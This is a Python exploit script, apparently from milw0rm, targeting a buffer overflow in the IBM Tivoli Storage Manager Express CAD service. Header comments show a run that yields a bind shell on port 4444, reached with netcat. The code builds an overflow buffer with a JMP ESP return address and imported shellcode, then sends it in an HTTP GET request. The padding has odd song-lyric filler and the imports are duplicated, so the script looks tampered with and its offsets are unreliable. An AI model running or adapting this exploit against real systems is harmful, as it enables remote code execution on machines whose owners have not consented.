#!/usr/bin/python
#
# IBM Tivoli Storage Manager Express CAD Service Buffer Overflow (5.3)
# http://www.zerodayinitiative.com/advisories/ZDI-07-054.html
# Tested on windows 2003 server SP0. 
# Coded by Mati Aharoni
# muts.at.offensive-security.com
# http://www.offensive-security.com/0day/dsmcad.py.txt
#
# bt ~ # ./dsmcad.py 192.168.1.107
# [*] IBM Tivoli Storage Manager Express CAD Service Buffer Overflow
# [*] http://www.offensive-security.com
# [*] Connecting to 192.168.1.107
# [*] Sending evil buffer, ph33r
# [*] Check port 4444 for bindshell
#
# bt ~ # nc -v 192.168.1.107 4444
# 192.168.1.107: inverse host lookup failed: Unknown host
# (UNKNOWN) [192.168.1.107] 4444 (krb524) open
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# E:\Program Files\Tivoli\TSM\baclient>

import socket
import sys
import socket
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):


	buffer=b"BirdsflyinghighyouknowhowIfeel"
	buffer+=b"SunintheskyyouknowhowIfeel"
	buffer+=b"ReeedsdriftinonbyyouknowhowIfeel"
	buffer+=b"ItsanewdawnItsanewdayItsanewlifeForme"
	buffer+=b"ItsanewdawnItsanewdayItsanewlifeFormeitsanewdawnitsanewdayforme"

	buffer+=b"\x38\x07\xD2\x77"	#77D20738 - FFE4 JMP ESP User32.dll Win2kSp0 EN
	buffer+=b"\x90"*4
	buffer+=buf
	expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )	
	expl.connect ( ( target_machine, target_port ) )
	expl.send ( b'GET /BACLIENT HTTP/1.0\r\nHost: 192.168.1.1 '+ buffer+b'\r\n\r\n')
	expl.close()
# milw0rm.com [2007-10-27]